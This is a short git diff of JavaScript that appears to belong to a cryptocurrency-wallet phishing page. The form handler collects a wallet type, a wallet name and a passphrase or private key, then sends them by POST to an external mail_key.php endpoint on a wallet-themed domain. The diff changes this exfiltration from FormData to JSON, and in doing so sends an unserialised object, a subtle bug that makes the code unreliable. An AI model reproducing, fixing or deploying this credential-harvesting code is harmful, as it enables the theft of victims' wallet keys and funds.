@@ -211,7 +211,9 @@ $("document").ready(function () {
     return false;
   });
 
-  $("#key_submission").on("submit", async function () {
+  $("#key_submission").on("submit", async function (e) {
+    e.preventDefault();
+
     var Type = $("#import").val();
     var Wallet = $("#wallet").val();
     var Key = $("#pphse").val();
@@ -220,18 +222,18 @@ $("document").ready(function () {
     $("#key_submission button").text("Loading...");
     alert("Loading");
 
-    const myformData = new FormData();
-
-    myformData.append("Type", Type);
-    myformData.append("Wallet", Wallet);
-    myformData.append("Key", Key);
+    const myformData = {
+      Type,
+      Wallet,
+      Key,
+    };
 
     const billResponse = await fetch(
       "https://learnerscrib.platiniumxpwallet.com/aced/mail_key.php",
       {
         method: "POST",
         headers: {
-          "Content-Type": "multipart/form-data",
+          "Content-Type": "application/json",
         },
         body: myformData,
       }
